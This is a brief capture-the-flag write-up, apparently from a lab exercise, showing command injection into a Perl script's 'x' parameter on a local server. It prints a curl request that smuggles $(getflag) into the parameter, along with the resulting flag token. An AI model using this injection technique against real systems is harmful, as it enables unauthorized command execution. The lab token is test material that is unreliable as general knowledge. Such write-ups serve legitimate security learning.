The goal here is to inject a shell command in the server.

First, I tried to inject a command in the "x" parameter from the Perl script :

``curl '10.0.2.15:4747?x=getflag'``

Instead of only send the ``getflag`` command, I asked to get the return value of this command throught the server execution :

``curl '10.0.2.15:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap``
